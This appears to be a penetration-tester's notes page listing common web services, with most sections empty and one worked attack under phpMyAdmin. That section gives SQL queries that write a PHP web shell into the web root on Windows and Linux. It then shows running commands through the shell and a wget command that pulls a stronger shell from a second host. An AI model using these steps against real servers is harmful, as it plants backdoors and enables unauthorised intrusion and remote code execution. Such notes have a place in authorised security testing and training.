# Common web-services

This is a list of some common web-services. The list is alphabetical.

## Cold Fusion

http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers

## Drupal

## Joomla

## Phpmyadmin

If you find a phpMyAdmin part of a site that does not have any authentication, or you have managed to bypass the authetication you can use it to upload a shell.

You go to:
```
http://192.168.1.101/phpmyadmin/
```

Then click on SQL. 

```
Run SQL query/queries on server "localhost":
```
From here we can just run a sql-query that creates a php script that works as a shell

So we add the following query:
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"

# For linux
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```
The query is pretty self-explanatory. Now you just visit `192.168.1.101/shell.php?cmd=ipconfig` and you have a working web-shell.
We can of course just write a superlong query with a better shell. But sometimes it is easier to just upload a simple web-shell, and from there download a better shell.

### Download a better shell

On linux-machines we can use wget to download a more powerful shell.

```
?cmd=wget%20192.168.1.102/shell.php
```

On windows-machines we can use tftp. 



## Wordpress
